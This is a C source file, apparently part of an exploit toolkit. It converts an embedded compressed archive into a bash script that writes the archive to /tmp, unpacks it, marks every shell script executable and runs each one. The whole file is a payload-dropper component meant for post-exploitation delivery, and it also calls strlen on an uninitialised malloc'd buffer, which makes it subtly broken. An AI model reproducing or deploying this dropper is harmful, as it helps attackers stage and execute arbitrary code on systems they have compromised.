#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#include "exploits_internal.h"

extern unsigned char payloads_tar_gz[];
extern unsigned int payloads_tar_gz_len;

char* get_payload_string() {
    char *payload = malloc(4 * payloads_tar_gz_len + 200);

    sprintf(payload + strlen(payload), "%s", "#!/bin/bash\necho -ne '");
    for (int i = 0; i < payloads_tar_gz_len; i++) {
        sprintf(payload + strlen(payload), "\\x%x", payloads_tar_gz[i]);
    }
    sprintf(payload + strlen(payload), "%s", "' > /tmp/payloads.tar.gz\n");
    sprintf(payload + strlen(payload), "%s", "tar -xvzf /tmp/payloads.tar.gz -C /tmp\n");
    sprintf(payload + strlen(payload), "%s", "cd /tmp/payloads\n");
    sprintf(payload + strlen(payload), "%s", "chmod +x *.sh\n");
    sprintf(payload + strlen(payload), "%s", "for f in *.sh; do bash \"$f\"; done\n");

    return payload;
}